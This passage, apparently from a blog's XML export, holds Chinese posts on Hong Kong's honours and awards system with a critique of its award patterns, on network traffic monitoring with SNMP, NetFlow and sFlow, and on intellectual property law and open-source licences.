二、烈士勋章（英勇勋章系列）颁授英勇勋章是为表扬某人士在个别事件中的英勇行为，分为三级：(i) 金英勇勋章(MBG):见义勇为，无惧高度危险，奋不顾身，堪称英勇行为的最高典范。(ii) 银英勇勋章(MBS):英勇非凡，堪称典范。(iii) 铜英勇勋章(MBB):英勇过人，殊堪嘉许。 从实际颁授的情况来看，英勇勋章系列基本上属于烈士勋章。从1998年至2017年有28人颁授金英勇勋章，有22人确认属于死后追授（另有4人无资料、1名瘫痪为植物人、1名重伤后转文职），例如：“2000年9月22日公布11名入境处职员获嘉许，以表扬他们在8月2日入境事务大楼涉嫌纵火事件中表现英勇及尽忠职守。6人获颁英勇勋章，另外5人获颁行政长官公共服务奖状。事件中身受重伤，终告不治的梁锦光先生，获追授金英勇勋章。另外，于同年7月29日，为拯救友人而遇溺的卢俊河先生，亦获追授金英勇勋章。” 三、纪律部队奖章（警察、消防、海关及廉政公署奖章系列） 按照业务部门划分为七个系列、四种层次设置 颁授对象区分高级首长和中下层一般职级 纪律部队和廉政公署 奖章 乃颁授予警务处、消防处、入境事务处、海关、惩教署和政府飞行服务队共六个纪律部队人员（上述统归保安局领导）及廉政公署人员，表扬他们致力服务社会、表现卓越。六个纪律部队和廉政公署人员可以颁授予 荣誉奖章，表扬他们忠于职守、能力过人、成就卓越，行为堪称典范，作出宝贵贡献。一般为 非首长级 人员。卓越奖章 颁授予六个纪律部队和廉政公署的 首长级(警司以上) 纪律部队人员，表扬他们致力服务社会及表现卓越。品格及行为良好，长期服务的各部队人员可以颁 授长期服务奖章加叙勋扣：第一加叙勋扣，服务满25年；第二加叙勋扣，服务满30年；第三加叙勋扣，服务满33年，算是老黄牛奖吧。 四、行政长官奖状（社区服务和公共服务系列）行政长官社区服务奖状（Chief Executive’s Commendation for Community Service） (i) 颁授予在某次行为或某项工作中表现出色，或服务社区表现卓越，但稍稍未及颁授荣誉勋章要求的人士。 行政长官公共服务奖状（Chief Executive’s Commendation for Government/Public Service） (ii) 颁授予在某次行动或某项工作中表现出色，或为某部门或机构服务，表现卓越，但稍稍未及颁授荣誉勋章要求的公务员或公职人员。 主要特点：考察期较短、特殊性(例如参加某次重要卧底行动)，级别低于荣誉勋章。 颁授和褫夺程序颁授程序部门首长提交提名书、遴选委员会审议推荐（纪律部队长期服务奖章除外）、行政长官决定、每年的7月1日由行政长官颁授勋章。 组织机构：授勋及非官守太平绅士遴选委员会授勋及非官守太平绅士遴选委员会（遴选委员会）负责初步甄选有关授勋及嘉奖人士的提名，以及有关委任非官守太平绅士的提名，向行政长官作出推荐。行政长官会亲自决定是否接纳推荐授勋和嘉奖的名单及委任非官守太平绅士的名单。为确保授勋及嘉奖的推荐标准一致、恰当和符合核准的颁授准则，由各局局长和部门首长提交的提名书，会经由遴选委员会审议。遴选委员会成员如下：主席：政务司司长非官守成员：行政会议成员、杰出的社会领袖官守成员：财政司司长、民政事务局局长、公务员叙用委员会主席、行政长官办公室主任、中央政策组顾问政府成立了两个小组委员会，协助遴选委员会工作。该两个小组委员会是：非主要勋衔小组委员会（公务员），其成员包括︰公务员事务局局长（主席）、公务员事务局常任秘书长、保安局副秘书长、一般职系处长、礼宾处处长（秘书）非主要勋衔小组委员会（一般市民），其成员包括︰行政署长（主席）、民政事务总署署长、社会福利署署长、工业贸易署署长、教育局副秘书长、礼宾处处长（秘书） 褫夺程序褫夺程序：作出有损授勋及嘉奖制度的名声的行为（例如法院判决定罪而入狱一年或以上）、启动褫夺机制（礼宾处处长）、行政长官亲自批准褫夺、宪报公告。 如获授勋／嘉奖人士的行为，会对其应否继续拥有该勋衔／奖状构成疑问，例如因被定罪而入狱一年或以上，不论是否获得缓刑，或作出有损授勋及嘉奖制度的名声的行为等，政府会考虑是否须褫夺其勋衔／奖状。 礼宾处处长会启动褫夺机制，处理获悉的褫夺勋衔／奖状个案。每宗褫夺勋衔／奖状的个案须由行政长官亲自批准。政府会在《宪报》公告将获授勋或嘉奖人士的姓名从授勋名单中剔除，并收回其勋章／奖状。（《宪报》即《香港政府宪报》（1841年5月1日—1997年6月30日），香港主权移交后改称《香港特别行政区政府宪报》（1997年7月1日—至今）。通常于逢星期五出版，香港的所有条例及附属法例，都要在宪报刊登（通称“刊宪”）才生效。曾有诉讼因相关法律未有刊宪，疑犯因而脱罪。） 现行嘉奖制度弊端在香港现代化进程中，曾经出现了一批奇才、大才，不仅事业成功，更兼人品德望，堪称香港社会的勋臣、乡贤。例如南洋商业银行创办人庄世平，一生与巨贾高官打交道，直到他离世时，都还居住于香港中银提供在跑马地荷塘道有52年楼龄的陈旧宿舍，四个儿子和两个女儿，没有一个在政界和商界出任要职，他的长子庄荣叙到退休前也不过是以租车送货、开巴士维生的普通香港人。又例如邵逸夫、田家炳、霍英东等，这些人里面很多都是出身草莽，事业有成之后于社会公益，或慈善、或教育、或体育，无不慷慨解囊，在海内外颇有贤名。但是，通过分析近年的授勋名单，作者发现香港现行授勋和嘉奖制度在执行过程中也存在诸多疑点、甚至严重弊端，略作解读，为读者镜鉴。 1、“太公分猪肉”舆论早有评论认为，勋章授勋名单明显有坐地分肥的味道，实际上已沦为“高官自己人俱乐部”。特区政府主要官员（行政长官、政务司长、财政司长、律政司长等）无一例外都被收于大紫荆勋章，甚至很大一部分是在任的时候颁授。遴选委员会本身由政务司长主持、主要政务官都是组成人员，从制度设计角度看就有严重缺陷，很容易给人以“既当运动员，又当裁判员”的想象，“你好我好大家好”的结果就必然导致遴选过程难言公允。更有诸多评论称授勋高官并无表现甚至失职，授勋是“太公分猪肉”（粤俚语，意人人有份）。 颁授年份 姓名 行政长官 2002年 曾荫权先生 第二任2005-2012 （时任政务司长） 2006年 董建华先生 第一任1997-2005 （时任全国政协副主席） 2011年 梁振英先生 第三任2012–2017 （时任行政会议召集人） 2016年 林郑月娥女士 第四任2017- （时任政务司长） 颁授年份 姓名 政务司长 2002年 锺逸杰爵士 1985-1987 （港英政府） 1999年 陈方安生女士 1993-2001 （时为现任政务司长） 2002年 曾荫权先生 2001-2005（时为现任政务司长） 2007年 许仕仁 2005-2007 （时为现任政务司长，刑事入罪褫夺勋章） 2009年 唐英年先生 2007-2011（时为现任政务司长） 2012年 林瑞麟先生 2011-2012（时为现任政务司长） 2016年 林郑月娥女士 2012-2017（时为现任政务司长） 颁授年份 姓名 财政司长 2002年 曾荫权先生 1995-2001（时为现任政务司长） 2009年 唐英年先生 2003-2007（时为现任政务司长） 2010年 曾俊华先生 2007-2017（时为现任财务司长） 2017年 陈茂波先生 署理财政司长2017（时为署理财务司长） 颁授年份 姓名 律政司长 2002年 梁爱诗女士 1997-2005（时为现任律政司长） 2012年 黄仁龙先生 2005-2012（时为现任律政司长） 2017年 袁国强先生 2012-2017（时为现任律政司长） 2、满眼皆是金融地产，产业畸形前途堪忧 行业 数量 比例 说明 金融工商 86人 90%+ 集中在金融、银行等大型财团，包括家族继承人、董事等高管 政府 15人 15% 特区政府主要官员（特首、三司一会） 司法界 8人 8% 大部分终审法院法官、大律师公会主席 医学界 2人 2% 历任香港医学会会长 科学界 3人 3% 光通讯科学（诺贝尔物理学奖）1人、加州伯克利大学前任校长1名（热物理学） 文艺界 2人 2% 包括金庸在内，都与大陆高层政治圈有莫名的联系 注：数据跨度1997-2017年共有95名大紫荆勋章获得者，上述分类只是粗略统计，其中部分获得者涉及多个领域，详细情况请自行检索。 虽然仅凭授勋名单及粗略的统计并不能说明所有问题，但是一叶知秋：近年以来香港治理当局不仅在经济上过于强调金融地产的绝对作用，而且在社会政策方面（包括嘉奖制度）也有明显的倾斜，既当高官又发大才兼上八卦周刊的案例甚多。产业空心化、优质人才流失，在发展质量和持续力方面出的问题，实际上在经济地位上也反应出来了：香港早已不复当年的亚洲四小龙翘楚的风光，GDP目前仅为台湾之1/3，韩国之1/5，同样也被新加坡反超。让我们来看一组香港贸易发展局提供的最新经济数字（2017年7月）：香港经济继2016年实质 增长2%后，于2017年第一季按年增长4.3%。预测2017年整体经济增长为2-3%。零售业销货額，以名义计，继在 2016年下跌8.1% 后，再于2017年1-5月按年 下跌0.7% 。劳工市场偏紧。截至2017年5月为止的3个月的经季节性调整 失业率为3.2%，2016年则为3.4%。消费物价继2016年上升2.4%后，于2017年1-5月上升1.1%。通胀的上行风险在短期内应该有限。香港货物出口继2016年轻微下跌0.5%后，于2017年1-5月按年上升8.2%。2017年全年，香港出口预期增长5%。 3、丑闻缠身、勋贤不“贤”；公器滥用，民望缩水此类案例甚多，真是五花八门、千奇百怪，在此仅简单罗列几项： 李国宝（2007年颁授）婚外情，传媒给予李国宝“宝Baby”的称号 唐英年（2009年颁授）婚外情，豪宅违建 冯国经：2008年金融海啸打击香港经济，冯获香港特区政府委任为“经济机遇委员会”成员，评估金融海啸对香港经济的影响及商讨应对方法。不久，冯旗下公司利丰集团却带头裁员，广受公众批评。 许仕仁：任政务司司长后，与商界藕断丝连，最终卷入刑事指控，在2014年于香港高等法院被裁定公职人员行为失当、串谋向公职人员提供利益等5项罪名成立，判禁7年半。褫夺勋章。 任志刚：金管局总裁，被指“山寨王”、严重失职；公众印象奢靡，例如88楼办公室可使用私人专用电梯出入，被认为是动用纳税人的血汗钱为自己建造尊贵享受。………. 上述诸多案例，很多可能是八卦，也有可能是媒体报道偏差。法无禁止即自由，但这是在私法领域而言；在公法领域则强调限制权力、“法无授权即禁止”。诸多案例反映出高官们为政庸懦、以公肥私之风大盛，小辫子被公众关切之后也鲜有人能站出来担当，如果是在韩国，很多人就该辞职或者去跳楼。治理当局如果不能在道德上自律——“不能正其身，如正人何？”。 从历年的授勋情况分析，大紫荆勋章“通货膨胀”的趋势明显香港调查研究中心研究员吴文涛曾发表文章表示，董建华政府对颁勋较为保守而不滥颁，对于最高荣誉的大紫荆勋章，曾因没有合适人选，在2003及2004年悬空不颁，除了向杨光（传统左派工联会）于2000年授勋引起议论外，并未有太多批评。而曾荫权授勋，令人觉得惟有做大商人，高官，亲近权贵，就是成功人士。自梁振英上任后，大紫荆勋章沦为酬谢支持者的报答更趋明显，例如2017年提名的大紫荆勋章获得者人数众多（与1997年持平），全部都是梁行政团队成员、竞选办公室主任、关系密切的地产商，赶在下台之前授勋，难免有“有权不用、过期作废”之观感。 总结 this nation, under God, shall have a new birth of freedom, and that government of the people, by the people, for the people, shall not perish from the earth. —— Abraham Lincoln 香港现行的授勋和嘉奖制度，受英国传统的爵士制度、170多年的太平绅士制度影响很深，经过特区政府成立之后的一些调整，总体上已经建立了比较统一、完备的制度体系结构。从1997年以来的实际授勋情况、特别是大紫荆勋衔的颁授情况来看，早期还是能够坚持谨慎使用、兼容并蓄的原则，但是后来有私相授受、“通货膨胀”的嫌疑。在制度价值判断方面，中国传统文化讲究“仁者爱人”，现代政治文明的首要之义在“天赋人权、人人平等”，正如孟子曰：“君子以仁存心，以礼存心。仁者爱人，有礼者敬人。爱人者人恒爱之，敬人者人恒敬之”。一个社会综合体是否真的尊重人、礼敬人，很容易通过授勋及嘉奖制度这一特殊窗口展现出来的，这一制度的设计不仅关乎价值导向，同样也是关乎政权的合法性的关键命题。滥用名器、“赢家通吃”，不仅扭曲了设立勋章制度的意义，而且容易加剧社会阶层矛盾，埋下繁荣、稳定的不确定风险。 扩展阅读：美军授勋和嘉奖制度观察参考文献 香港特区政府总部礼宾处：授勋及嘉奖 香港太平绅士列表 香港2017年度授勋及嘉奖名单 香港贸易发展局：贸易概况2017年7月]]></content>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈基于数据分析的网络态势感知]]></title>
    <url>%2F2017%2F07%2F14%2FNetwork-sFlow%2F</url>
    <content type="text"><![CDATA[摘要态势感知（Situational Awareness，SA）的概念最早在军事领域被提出。20世纪80年代，美国空军就提出了态势感知的概念，覆盖感知（感觉）、理解和预测三个层次。90年代,态势感知的概念开始被逐渐被接受，并随着网络的兴起而升级为“网络态势感知（Cyberspace Situation Awareness，CSA）”，指在大规模网络环境中对能够引起网络态势发生变化的安全要素进行获取、理解、显示以及最近发展趋势的顺延性预测，而最终的目的是要进行决策与行动。本文将围绕以下话题讨论网络态势感知中的几个常见问题： 网络感知的基础:网络分层、传感器 网络分析技术：SNMP、NetFlow、sFlow、NetStream、Packet Capturing 网络数据可视化: WireShark、NTopng、Ganglia、GeoIP 一、网络感知的基础1、没有任何一个传感器是全能的测量一个网络的一般步骤如下：首先获得网络拓扑图，网络的连接方法、潜在的观察点列表等；然后确定潜在观察点，确定该位置所能看到的流量；最后，确定最优的覆盖方案。在复杂网络中，没有任何一个传感器能够全面覆盖，需要多种传感器配合使用。按照采集的领域，传感器可以分为三类： 网络：入侵检测系统（IDS）、NetFlow采集器、TCP采集器（如tcpdump） 主机：驻留在主机上，监控主机上的活动（文件访问、登录注销）、网卡流量 服务：邮件消息、特定服务的HTTP请求 2、网络分层对传感器的影响总的来说，网络传感器的焦点是OSI模型中的第2层～第4层，而服务传感器的焦点是第5层及以上。分层对网络流量的影响中，还需要考虑最大传输单元（MTU）：数据帧尺寸的上限，影响到介质中可以传送的封包的最大尺寸，以太网的MTU为1500字节，即IP封包不会超过这个尺寸。OSI模型第5层会话层需要考虑的情况是会话加密，加密后的信息无法直接理解；在第6层和第7层中，必须知道协议细节，才能提取有意义的信息。 二、网络分析技术网络流量反映了网络的运行状态，是判别网络运行是否正常的关键。如果网络所接收的流量超过其实际运载能力，就会引起网络性能下降。网络中流量的各种参数主要包括：接收和发送数据报、丢包率、数据报延迟。 1、SNMPSNMP（ Simple Network Management Protocol )包含一个应用层协议（application layer protocol）、数据库模型（database schema），和一组数据对象。SNMP的第一个RFC系列出现在1988年(RFC1065-1067)，第二版（RFC1441–1452）作了修订，由于第二版的新安全系统被认为过于复杂而不被广泛接受，因此出现了两个方案：SNMP v2c（基于社区，RFC1901–1908）、SNMP v2u(基于用户，RFC1909–1910)。SNMP第三版（RFC3411-3418）主要增加了安全性方面的强化：信息完整性，保证数据包在发送中没有被窜改；认证，检验信息来自正确的来源；数据包加密，避免被未授权的来源窥探。 基于SNMP协议定义的计数器：ifInOctets、ifOutOctets，两次采样的差值除以间隔时间即可获得平均流量。需要注意的是计数器的数据类型有两种：counter32和counter64。counter32计数的最大值是2的32次方减1，当超过4G的时候，计数器就会清零。如果是大流量、高精度采样（间隔时间低于1分钟），需要考虑使用counter64（ifHCInOctets、ifHCOutOctets）,否则可能出现数据偏差，例如： 12345snmpwalk -v 2c -c public -u username 192.168.1.10 ifHCInOctetsIF-MIB::ifHCInOctets.1 = Counter64: 5020760IF-MIB::ifHCInOctets.2 = Counter64: 12343743IF-MIB::ifHCInOctets.3 = Counter64: 7123IF-MIB::ifHCInOctets.21 = Counter64: 3854 2、RMONSNMP是基于TCP/IP、应用最广泛的网管协议，但是也有一些明显的不足，如：SNMP使用轮询方式采集数据信息，在大型网络中轮询会产生巨大的网络管理通讯报文；不支持管理进程的分布式管理，它将收集数据的负担加在网管站上，网络管理站会成为瓶颈；只能从这些管理信息库中获得单个设备的局部信息，标准管理信息库MIB-II(RFC1213)和各厂家的专有MIB库主要提供设备端口状态、流量、错误包数等数据，要想获得一个网段的性能信息是比较困难。 因此IETF提出了RMON（Remote Network Monitoring，RFC2021）以解决SNMP所面临的局限性。RMON 由 SNMP MIB 扩展而来，网络监视数据包含了一组统计数据和性能指标，它们在不同的监视器（或称探测器）和控制台系统之间相互交换。它可以主动地监测远程设备，对设备端口所连接的网段上的各种流量信息进行跟踪统计，如某段时间内某网段上报文总数等。只要给予探测器足够的资源，它还可以对数据设备进行防防性监视，设备主动地对网络性能进行诊断并记录网络性能状况，在发生故障时可以把信息及时通知管理者，相关信息分为统计量、历史、告警、事件等四个组，可以预置规则。 3、NetFlow vs sFlow vs NetStreamNetFlow最早由 Cisco 研发的流量汇总标准，最初用于网络服务计费，本意不是为了流量分析和信息安全。它通过路由器提供收集IP网络流量的能力，分析的NetFlow数据（UDP packets）感知网络流量和拥塞情况。NetFlow的核心概念流（Flow），NetFlow直接从 IP Packet 中复制信息，包含来源及目的地、服务的种类等字段： Source and destination IP address Input and output interface number Source and destination port number Layer 4 Protocol Number of packets in the flow Total Bytes in the flow Time stamp in the flow Source and destination AS TCP_Flag &amp; TOS NetFlow vs IPFIX NetFlow 的主力实现版本是 v5，但是 v5 主要针对 IPv4 存在很多限制，因此 Cisco 推出了基于模版的 NetFlow v9 。在NetFlow v9 的基础上，IETF在2008年发布了标准化的 IPFIX( Internet Protocol Flow Information eXport)（RFC5101/5102），IPFIX 提供了几百种流字段。另外，Juniper也有一套自己的标准 J-Flow 。 sFlow (Sampled Flow, 采样流，RFC3176 )是另一种一种基于报文采样的网络流量监控技术，主要用于对网络流量进行统计分析。sFlow 2001年由lnMon公司提出来，目前是IEFE的一个开放标准，可提供完整的第二层到第四层、全网络范围内的流量信息。sFlow 关注的是接口的流量情况、转发情况以及设备整体运行状况，因此适合于网络异 常监控以及网络异常定位，通过 Collector 可以以报表的方式将情况反应出来，特别适合于企业网用户 。sFlow Agent内嵌于网络设备中，在 sFlow 系统中收集流量统计数据发送到 Collector 端供分析。 NetStream 是H3C定义的一套网络流量的数据统计方法。它需要由特定的设备支持，首先由设备自身对网络流进行初步的统计分析，并把统计信息储存在缓存区。值得注意的是，NetStream（IPv6）功能需要跟华为购买License，并且NetStream功能和sFlow功能不能同时在同一接口板上配置。如果接口板已经配置sFlow功能，则不能配置NetStream功能。 综上所述，各种 NetFlow 方案都是基于网络硬件设施生成或者软件封包为流，不同的厂商标准不同，尤其需要考虑兼容性。同时，各种机制都可能对硬件造成性能问题，特别是旧的型号存在更大的风险，一般不轻易开启。无论是硬件（中高端设备）还是软件（nProbe、nDPI）、NetStream（IPv6），都意味着昂贵的费用，需要充分考虑成本预算。 4、NetFlow的其它替代方案基于软件替代路由采集，基本都是采用封包的思路，将pcap文件当作数据源或者直接从网络接口上封包，通过解析Header聚合成流格式或者更丰富的输出。常见的产品如下： CERT YAT(Yet Another Flowmeter) softflowd QoSient Argus 5、协议和用户识别 我们可以把数据包想像成一封信。根据解析数据报报头的内容，可以分析IP地址、端口号、协议、报文格式等特征，分类后可以实现对各种应用层协议的准确识别，如P2P（迅雷）、即时通信（QQ、微信）、VPN、邮件等。当然，这只能算是“浅度”的数据包检测，就好像是看看信封上的发件人和收件人 。 “深度”的数据包检测，可以理解成对信件内容的探查──相比起暴力打开信封，这种基于机器学习的技术更具有艺术性。它并不实际解读数据包的内容，而是搜集周边信息，对数据流进行“肖像刻划”（Profiling）。国内某研究团队曾发表论文“网络流量分类，研究进展与展望”，文章提到了多种使用机器学习进行“深度数据包检测”（Deep Packet Inspection，DPI）的技术。对“墙”有兴趣的同学可以深入了解,https://riboseyim.github.io/2017/05/12/GFW/ 。 三、网络数据可视化1、面向流向分析的可视化文中开头我们就提到测量网络的第一步就是获得网络拓扑图，如果要获得全局角度实时感知能力，需要在拓扑的基础之上叠加通过各种网络分析技术获得的流量/Flow/事件等信息，进而处理分析网络异常流量。能够实用的数据分析具有相当的复杂性，需要专门的工具软件，区分正常流量数据和异常流量数据、对于“异常模式”的算法训练都有一定门槛，因此存在大量的开源和商业解决方案。 2、面向故障诊断的可视化 抓包工具：tcpdump、TShark、 WinDump 图形化工具：wireshark(客户端)、ntopng(webUI) 自定义编程：R、Python(Python-Scapy)、Graphviz工具包 一个典型的故障场景：两个服务之间发生故障、无法收发信息，可以通过tcpdump的抓包，并将抓包结果在WireShark上分析，基于染色的方式通信失败的报文被高亮提示。TCP通信中客户端向服务端发送tcp zero window（表示没有window可以接收新数据），如果出现该特征一般可以确定故障是由接收端服务器TCP缓冲区占满的引起，应将排查方向锁定在接收端。关于网络数据包的捕获、过滤、分析的具体实现细节，可以参考：Packet Capturing:关于网络数据包的捕获、过滤和分析 在企业应用中，网络监测数据通常需要与基础监控平台融合才能发挥最大价值（开源的方案 Zabbix/Ganglia/Nagios／Graphite 等）。Collectd 与Ganglia 是竞争关系，都是C语言开发,数据输出都是RRDTool，性能应该差不多，Collectd不包含图形化组件。zabbix是覆盖面比较广的综合套件，除了采集还有告警等其它管理功能，专业性和大规模应用方面可能就不太强。Nagios在思路方面比较接近zabbix,走的是综合性路子，侧重于告警方案：“Ganglia is more concerned with gathering metrics and tracking them over time while Nagios has focused on being an alerting mechanism.” 在Ganglia项目中提供了一个 gmond_proxy 可以搭配 sFlow-RT 支持 NetFlow／sFlow 的数据收集，如果是自己实现 sFlow-RT 类似的组件也需要考虑对 Logstash/splunk的支持。 开源项目 开发语言 定位 说明 Collectd C 数据采集器 不包含图形化组件 Ganglia C，PHP（front-end） 数据采集器 包含一个Web图形化组件 Zabbix C，PHP（front-end） Server-Client 不包含图形化扩展插件 Nagios C ，PHP（front-end） Core+Plugins 包含多种图形化扩展插件 Grafana Go 指标数据的可视化展现板 需要提前对数据进行时序化处理，例如 InfluxDB 等 扩展阅读 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 3、面向安全分析的可视化 流向&amp;协议：Ntopng 地理位置服务，根据IP地址确定改地址的物理位置信息（坐标）：MaxMind GeoIP 安全威胁情报服务，通过信息共享渠道了解识别攻击者的来源、类型和安全厂商确认情况，做到知己知彼。 拓展话题：SDN 网络中的可视化与数据封包 DPDK(Data Plane Development Kit)运行于Intel X86平台，是 Intel 开源的一组快速处理数据包的开发平台及接口（BSD）。重载了网卡驱动，该驱动在收到数据包后不中断通知CPU，而是将数据包通过零拷贝技术存入内存，这时应用层程序就可以通过DPDK提供的接口，直接从内存读取数据包。这种处理方式节省了CPU中断时间、内存拷贝时间，并向应用层提供了简单易行且高效的数据包处理方式，使得网络应用的开发更加方便。 专题合辑：Network Engineering SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? Preview SDN 技术指南（七）：产业联盟与标准化组织 Preview SDN 技术指南（八）：案例 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: IPv6 &amp; Security AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 Cyber-Security|香港拟增设网络安全与科技罪案总警司 参考文献 sFlow: Theory and Practice of a Sampling Technology and Its Analysis with Wireshark 维基百科：NetFlow sflow.com:InfluxDB and Grafana sflow.com:Metric export to Graphite sflow.com:Exporting events using syslog sflow.com:Cluster performance metrics sflow.com:Using a proxy to feed metrics into Ganglia 李晨光：详解网络流量分析 飞翔的单车：解决zabbix用snmp监控网络流量不准的问题 lifeofzjs.com:Nagios监控工具介绍 王基立:Nagios企业级系统监控方案 Top 10 Best Free Netflow Analyzers and Collectors for Windows JUNIPER Networks:Juniper Flow Mornitoring nProbe:An Extensible NetFlow v5/v9/IPFIX Probe for IPv4/v6 华为：一种计算机网络远程网络监控方法，CN 1393801 A Cisco Systems NetFlow Services Export Version 9 manageengine.com：NetFlow Analyzer - Supported Devices H3C.com:NetStream技术介绍]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[知识产权法 (Intellectual Property Law)]]></title>
    <url>%2F2017%2F07%2F09%2FLaw-Of-Intellectual-Property%2F</url>
    <content type="text"><![CDATA[摘要 什么是知识产权？ 美国知识产权法（计算机软件） 商业秘密 版权 专利 如何选择开源许可证 关于机器学习模型或训练数据的产权保护 世界各国专利分布 什么是知识产权？ 了解知识产权保护的关键是要理解我们要保护的东西是无形的创造性工作，而不是它的具体物理形态。（《火的礼物》） 知识和艺术作品的价值来自创意、想法、科研、技能、劳动，以及它们的创作者所提供的其他非物质的努力和属性。我们对所创建或购买的物理财产拥有财产权，这包括它的使用权，防止其他人使用，以及设定价格来销售它的权利。如果其他人可以随便把它们拿走，那么我们将不愿意付出努力来购买或生产这些物品。……保护知识产权对个人和社会都有好处：通过保护艺术家、作家和发明家的权利，可以补充他们的创造努力，而通过这样做，也会鼓励生产有价值的、无形的、容易被复制的创造性工作。（《火的礼物》P177） 美国知识产权法历史 1789 年《宪法》第一章第 8 款：国会应有权……促进科学和实用艺术的进步，确保有限时报作者和发明者的独家权利，以及他们各自的著作和发现。 1790年4月10日，美国第一部版权法。保护范围：图书、地图和图表，之后扩展到摄影、录音和电影。（大清国乾隆五十五年，同年本杰明·富兰克林&amp;亚当·斯密逝世） 1909年版权法案。未经授权的复制的定义必须是从视觉上可以看到或阅读的一种形式（音乐卷片、ROM芯片上下象棋的游戏等都不在保护之列）。 1976年和1980年，版权法修改，使之涵盖了计算机软件。 关于知识产权制度，从诞生的那一天起实际上就存在支持/反对两大阵营。黑客大多坚定地站在反对派阵营，或者说黑客群体是反对知识产权制度中最重要的一支力量。黑客反对知识产权制度的观点中，最重要的一条是保护人的“思想自由”。黑客（Hacker）群体在许多方面都表现出强烈的精英意识和自觉。例如，他们坚定地认为，知识产权制度无益于增加公众福利。不仅破坏思想自由权利，而且有加强极权主义制度的巨大危险。他们坚信，保护人的思想自由，就是保护国家持续发展根本动力，只有获得独步天下的技术优势，才有可能增加公众福利，反之，则是非常危险的。 对于版权和专利这样的制度，黑客深感担忧。他们感到，保护“知识产权”的力度不断增大，已经威胁到了他们完成工作所必需的“思想自由”。立法者的愿意可能是好的。但是，他们也许没有意识到，这样的法律弊大于利。(《黑客与画家》（Hackers &amp; Painters），Paul Graham) 在我看来，一个人们拥有言论自由和行动自由的社会，往往最有可能采纳最优方案，而不是采纳最有权势的人提出的方案。专制国家会变成腐败国家，腐败国家会变成贫穷国家，贫穷国家会变成弱小国家。…. 极权主义制度只要形成了，就很难废除。黑客对于公民自由是非常敏感的，因为这对他们至关重要。他们远远地就能感到极权主义的威胁，好比动物能够感知即将来临的暴风雨。(《黑客与画家》（Hackers &amp; Painters），Paul Graham) 美国知识产权法（计算机软件）商业秘密保护计算机软件商业秘密经典案例 数据总公司案 雷克斯案 版权保护美国版权法（美国法典第17篇） 电子游戏使用者界面计算机软件版权经典案例专利保护软件专利的实质性要件 新颖性 非显而易见性 充分披露与最佳方案 计算机软件专利经典案例 亚马逊案 王氏实验室案 不列颠通讯公司案 欧洲专利局欧洲专利局（European Patent Office，简称 EPO）是根据《欧洲专利公约》（EPC）成立的政府间组织，其主要职能是负责欧洲专利申请的审查、批准及欧洲专利授权公告后异议的审理以及文献出版工作。1973 年欧洲16个国家签订了《欧洲专利公约》，该公约于 1978 年正式生效，这标志着欧洲建立了从申请到授权一体化的专利制度。目前，欧洲专利局成员国已达 38 个，其授权专利在 40 个欧洲国家生效（包括 38 个缔约国和 4 个延伸国）。https://worldwide.espacenet.com/?locale=cn_EP 开源软件许可证 右翼阵营（“copyright”）代表为著作权 ，从不授予用户任何权利（除了使用的权利），更多的是限制性规定，例如复制、修改、分发等，也可以包括一些法律允许的行为，比如逆向工程。 左翼阵营（“copyleft”）代表为 GPL 许可证( GNU 通用公共许可协议,GNU General Public License，简称 GNU GPL、GPL，港台地区翻译为“GNU通用公共授权条款”）是广泛使用的免费软件许可证，最初由GNU项目的自由软件基金会（FSF）的理查德·斯托曼（Richard Matthew Stallman）撰写。 GPL 授予被许可人以下权利（或称“自由”）： 以任何目的运行此程序的自由； 再复制的自由； 修改程序并公开发布改进版的自由（前提是能得到源代码）。 GPL 及其它 Copyleft 协议授予了被许可人（几乎是任何人）以非常广泛的自由，同时利用版权法设计了“传染机制”：GPL明确规定，任何源码的衍生产品，如果对外发布，都必须保持同样的许可证。这就是说，任何人只要发布基于某个GPL软件的修改版本，他就必须公开源码，并且同意他人可以自由地复制和分发，否则原始作者可以根据版权法起诉 。 中间阵营（copycenter，中间版权）代表为 BSD 许可证（Berkeley Software Distribution license）。跟其他许可证相比，BSD许可证比较宽松，跟公有领域更为接近，BSD 许可证被认为是介乎 copyright 与 copyleft之间 。 “Take it down to the copy center and make as many copies as you want”。 可以说，GPL强迫后续版本必须一样是自由软件，BSD 的后续版本可以选择要继续是 BSD 或其他自由软件条款或封闭软件等等。 判例著作权 裁判文书网：北京中青文文化传媒有限公司与北京百度网讯科技有限公司侵害作品信息网络传播权纠纷申请再审民事裁定书 人工智能 上海智臻智能网络科技股份有限公司、苹果电脑贸易（上海）有限公司与国家知识产权局专利复审委员会再审行政裁定书 诈骗类 湖南领创智能科技有限公司与田凯文民间借贷纠纷再审民事裁定书 扩展阅读 Cyber-Security: 黑客与技术、产业及其精神世界 动态追踪技术(五)：Welcome DTrace for Linux （构思）基于专利文档的信息检索 参考文献 《美国知识产权法》，李明德 《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase（莎拉芭氏） 欧洲专利局手册|包含EPO收录的世界各国专利文献统计数据 案例：知名公司（努比亚/中兴）拿我的开源软件（ XXL-JOB）申请国家知识专利 Google和Oracle关于Java的版权官司等 如何选择开源许可证 | 阮一峰,2011-05 为什么GPL是更好的开源许可证? | 阮一峰,2010-02 维基百科：Copyleft 学术界的“盗版女王” 取消版权保护与战后美国的科学进步 | 量化历史研究]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：数据可视化]]></title>
    <url>%2F2017%2F07%2F06%2FVisualization%2F</url>
